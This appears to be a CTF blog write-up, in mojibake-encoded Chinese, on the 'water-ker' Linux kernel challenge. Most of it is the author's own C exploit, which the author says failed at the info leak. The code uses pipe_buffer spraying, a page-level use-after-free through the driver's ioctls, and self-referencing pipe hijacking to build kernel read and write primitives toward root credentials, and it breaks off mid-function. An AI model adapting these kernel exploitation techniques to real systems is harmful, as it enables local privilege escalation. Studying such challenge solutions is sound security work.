<p>åœ¨æ„é€ ç¬¬ä¸€ä¸ª page-level-uaf ä¸­ï¼Œè¯»å–å†…å®¹å³ä½¿æ‰¾åˆ°ä¹Ÿä¸èƒ½ breakï¼Œå¦åˆ™ç¬¬äºŒæ¬¡è¯»å–å‡ºé”™ã€‚</p>
<p>exp å¦‚ä¸‹</p>
<ul>
<li>åœ¨info leak å‡ºé”™ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆè¯»å–ä¸å‡ºæ¥å†…å®¹ï¼Œçœ‹äº†å‡ éä¹Ÿä¸çŸ¥é“å“ªé‡Œå‡ºé—®é¢˜ï¼Œå½“å±€è€…è¿·å§ğŸ¤¡ã€‚</li>
</ul>
<p>æ‰¾åˆ°ä¸€ç¯‡æ–‡ç« ï¼š<a href="https://blog.csdn.net/qq_61670993/article/details/134359694">å¼ºç½‘æ‹Ÿæ€2023-water-ker</a>ï¼Œexpå¯ä»¥ææƒï¼Œç¼–è¯‘æ—¶æ˜¾ç¤ºç¼ºå°‘äº†ä¸€ä¸ªæ‹¬å·ï¼Œè¡¥ä¸Šå°±è¡Œã€‚</p>
<p>å¦‚ä¸‹ä¸ºå¤±è´¥çš„expã€‚<del>æ²¡æˆåŠŸä¸ºä»€ä¹ˆè¦æ”¾ä¸Šæ¥ï¼Œä¸èƒ½è®©æˆ‘ç™½å†™å§</del></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_SPRAY_NUMS 200</span></span><br><span class="line"><span class="comment">// kmalloc-cg-96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SND_PIPE_BUFS_SIZE 96</span></span><br><span class="line"><span class="comment">// kmalloc-cg-192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRD_PIPE_BUFS_SIZE 192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(fmt, ...) \</span></span><br><span class="line"><span class="meta">  dprintf(2, <span class="string">&quot;\033[32m[+] &quot;</span> fmt <span class="string">&quot;\033[0m\n&quot;</span>, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">page</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_inode_info</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">page</span> *page;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span> *ops;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span> &#123;</span><br><span class="line">  <span class="built_in">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">int</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">int</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> vmemmap_base = <span class="number">0xffffea0000000000</span>;</span><br><span class="line"><span class="type">size_t</span> page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line"><span class="type">size_t</span> init_task, init_nsproxy, init_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> spray_pipe_fd[PIPE_SPRAY_NUMS][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"><span class="type">int</span> victim_idx = <span class="number">-1</span>, origin_idx = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> snd_victim_idx = <span class="number">-1</span>, snd_origin_idx = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> self_pipe_idx_2 = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> self_pipe_idx_3 = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> self_pipe_idx_4 = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> info_pipe_buf;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> evil_pipe_buf;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> evil_pipe_buf_2, evil_pipe_buf_3, evil_pipe_buf_4;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> temp_zero_buf[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">water_args</span> &#123;</span><br><span class="line">  <span class="type">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">new_chunk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">512</span>];</span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0x44</span>, <span class="built_in">sizeof</span>(buffer));</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = buffer,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x20</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">delete_chunk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = <span class="literal">NULL</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x30</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">edit_chunk</span><span class="params">(<span class="type">char</span> c)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = &amp;c,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x50</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[-] error: %s&quot;</span>, msg);</span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">5</span>);</span><br><span class="line">  <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">debug</span><span class="params">(<span class="type">char</span> *msg)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(msg);</span><br><span class="line">  <span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">page_level_uaf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;spray pipe&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">pipe</span>(spray_pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;new chunk then free&quot;</span>);</span><br><span class="line">  <span class="built_in">new_chunk</span>();</span><br><span class="line">  <span class="comment">// debug(&quot;write chunk data D&quot;);</span></span><br><span class="line">  <span class="built_in">delete_chunk</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;get victim chunk&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i ++) &#123;</span><br><span class="line">    <span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;alloc pipe_buffer pages&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;uaf change pipe-&gt;bufs-&gt;page&quot;</span>);</span><br><span class="line">  <span class="built_in">edit_chunk</span>(<span class="number">0x00</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;find victim pipe&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="type">char</span> tags[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">int</span> nr;</span><br><span class="line">    <span class="built_in">memset</span>(tags, <span class="number">0</span>, <span class="built_in">sizeof</span>(tags));</span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], tags, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(tags, <span class="string">&quot;deadbeef&quot;</span>) &amp;&amp; nr != i) &#123;</span><br><span class="line">      origin_idx = nr;</span><br><span class="line">      victim_idx = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;succeed find victim: %d, origin: %d&quot;</span>, victim_idx, origin_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (victim_idx == <span class="number">-1</span> || origin_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;find idx&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">second_page_level_uaf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">0x400</span>];</span><br><span class="line">  <span class="type">size_t</span> snd_pipe_sz =</span><br><span class="line">      <span class="number">0x1000</span> * (SND_PIPE_BUFS_SIZE / <span class="built_in">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;write something to no.1 victim pipe&quot;</span>);</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[victim_idx][<span class="number">1</span>], buffer,</span><br><span class="line">        SND_PIPE_BUFS_SIZE * <span class="number">2</span> - <span class="number">24</span> - <span class="number">3</span> * <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;close no.1 origin idx pipe to page-level-uaf&quot;</span>);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[origin_idx][<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[origin_idx][<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == victim_idx) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;fcntl()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">read</span>(spray_pipe_fd[victim_idx][<span class="number">0</span>], buffer,</span><br><span class="line">       SND_PIPE_BUFS_SIZE - <span class="number">8</span> - <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">  <span class="built_in">read</span>(spray_pipe_fd[victim_idx][<span class="number">0</span>], &amp;info_pipe_buf, <span class="built_in">sizeof</span>(info_pipe_buf));</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;page pointer: %p\n\t\tops: %p&quot;</span>, info_pipe_buf.page,</span><br><span class="line">           info_pipe_buf.ops);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">size_t</span>)info_pipe_buf.page &lt; <span class="number">0xffff000000000000</span> ||</span><br><span class="line">      (<span class="type">size_t</span>)info_pipe_buf.ops &lt; <span class="number">0xffffffff81000000</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;FAILED to re-hit victim page!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;hit the UAF page successful&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;construct no.2 page level uaf&quot;</span>);</span><br><span class="line">  info_pipe_buf.page = (<span class="keyword">struct</span> page *)(<span class="number">0x40</span> + (<span class="type">size_t</span>)info_pipe_buf.page);</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[victim_idx][<span class="number">1</span>], &amp;info_pipe_buf, <span class="built_in">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;try find no.2 page uaf by pipe tags&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == victim_idx) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> nr = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="comment">// printf(&quot;%#x\n&quot;, nr);</span></span><br><span class="line">    <span class="keyword">if</span> (nr &lt; PIPE_SPRAY_NUMS &amp;&amp; nr != i) &#123;</span><br><span class="line">      snd_origin_idx = nr;</span><br><span class="line">      snd_victim_idx = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;find second pipe victim_idx: %d&quot;</span>, snd_victim_idx);</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;find second pipe origin_idx: %d&quot;</span>, snd_origin_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (snd_victim_idx == <span class="number">-1</span> || snd_origin_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;failed find snd pipe&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;find no.2 idx sucessfully&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">construct_self_pipe</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">0x1000</span>];</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">page</span> *page_ptr;</span><br><span class="line">  <span class="type">size_t</span> trd_pipe_sz =</span><br><span class="line">      <span class="number">0x1000</span> * (TRD_PIPE_BUFS_SIZE / <span class="built_in">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;write to no.2 victim pipe&quot;</span>);</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], buffer,</span><br><span class="line">        TRD_PIPE_BUFS_SIZE - <span class="number">24</span> - <span class="number">3</span> * <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;close no.2 origin pipe to make second page level uaf&quot;</span>);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[snd_origin_idx][<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[snd_origin_idx][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == snd_origin_idx || i == victim_idx ||</span><br><span class="line">        i == snd_victim_idx) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;fcntl() pipe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;hijack pipe 2 page to itself&quot;</span>);</span><br><span class="line">  evil_pipe_buf.page = info_pipe_buf.page;</span><br><span class="line">  evil_pipe_buf.offset = TRD_PIPE_BUFS_SIZE;</span><br><span class="line">  evil_pipe_buf.len = TRD_PIPE_BUFS_SIZE;</span><br><span class="line">  evil_pipe_buf.ops = info_pipe_buf.ops;</span><br><span class="line">  evil_pipe_buf.flags = info_pipe_buf.flags;</span><br><span class="line">  evil_pipe_buf.<span class="keyword">private</span> = info_pipe_buf.<span class="keyword">private</span>;</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], &amp;evil_pipe_buf,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;try find pipe 2 idx&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == victim_idx || i == snd_origin_idx ||</span><br><span class="line">        i == snd_victim_idx) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="built_in">sizeof</span>(page_ptr));</span><br><span class="line">    <span class="comment">// printf(&quot;page ptr: %#lx&quot;, (size_t)page_ptr);</span></span><br><span class="line">    <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">      self_pipe_idx_2 = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;Found self pipe 2: %d&quot;</span>, self_pipe_idx_2);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (self_pipe_idx_2 == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;FAILED to build a self-writing pipe 2!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;hijack pipe 3 page to itself&quot;</span>);</span><br><span class="line">  evil_pipe_buf.offset = TRD_PIPE_BUFS_SIZE;</span><br><span class="line">  evil_pipe_buf.len = TRD_PIPE_BUFS_SIZE;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], buffer,</span><br><span class="line">        TRD_PIPE_BUFS_SIZE - <span class="built_in">sizeof</span>(evil_pipe_buf));</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], &amp;evil_pipe_buf,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;try find pipe 3 idx&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == victim_idx || i == snd_origin_idx ||</span><br><span class="line">        i == snd_victim_idx || i == self_pipe_idx_2) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="built_in">sizeof</span>(page_ptr));</span><br><span class="line">    <span class="comment">// printf(&quot;page ptr: %#lx&quot;, (size_t)page_ptr);</span></span><br><span class="line">    <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">      self_pipe_idx_3 = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;Found self pipe 3: %d&quot;</span>, self_pipe_idx_3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (self_pipe_idx_3 == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;FAILED to build a self-writing pipe 3!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;try hijack pipe 4 page to itself&quot;</span>);</span><br><span class="line">  evil_pipe_buf.offset = TRD_PIPE_BUFS_SIZE;</span><br><span class="line">  evil_pipe_buf.len = TRD_PIPE_BUFS_SIZE;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], buffer,</span><br><span class="line">        TRD_PIPE_BUFS_SIZE - <span class="built_in">sizeof</span>(evil_pipe_buf));</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], &amp;evil_pipe_buf,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;try find pipe 4 idx&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == victim_idx || i == snd_origin_idx ||</span><br><span class="line">        i == snd_victim_idx || i == self_pipe_idx_2 || i == self_pipe_idx_3) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="built_in">sizeof</span>(page_ptr));</span><br><span class="line">    <span class="comment">// printf(&quot;page ptr: %#lx&quot;, (size_t)page_ptr);</span></span><br><span class="line">    <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">      self_pipe_idx_4 = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;Found self pipe 4: %d&quot;</span>, self_pipe_idx_4);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (self_pipe_idx_4 == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;FAILED to build a self-writing pipe 4!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;find self rw pipe 2 3 4 successfully&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup_evil_pipe</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;set up 2 3 4 pipe buffer&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;evil_pipe_buf_2, &amp;info_pipe_buf, <span class="built_in">sizeof</span>(evil_pipe_buf_2));</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;evil_pipe_buf_3, &amp;info_pipe_buf, <span class="built_in">sizeof</span>(evil_pipe_buf_3));</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;evil_pipe_buf_4, &amp;info_pipe_buf, <span class="built_in">sizeof</span>(evil_pipe_buf_4));</span><br><span class="line"></span><br><span class="line">  evil_pipe_buf_2.offset = <span class="number">0</span>;</span><br><span class="line">  evil_pipe_buf_2.len = <span class="number">0xff8</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* hijack 3 -&gt; 4 */</span></span><br><span class="line">  evil_pipe_buf_3.offset = TRD_PIPE_BUFS_SIZE * <span class="number">3</span>;</span><br><span class="line">  evil_pipe_buf_3.len = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// ?? å†™4</span></span><br><span class="line">  <span class="comment">// å› ä¸ºå†™ pipe æ—¶ä» offset + len å¼€å§‹å†™ï¼Œå°±æ˜¯å†™å…¥3ä¸­</span></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;hijack pipe 3 to write pipe 4&quot;</span>);</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], &amp;evil_pipe_buf_3,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_3));</span><br><span class="line"></span><br><span class="line">  evil_pipe_buf_4.offset = TRD_PIPE_BUFS_SIZE;</span><br><span class="line">  evil_pipe_buf_4.len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pipe_arb_read</span><span class="params">(<span class="keyword">struct</span> page *page_to_read, <span class="type">void</span> *dst)</span> </span>&#123;</span><br><span class="line">  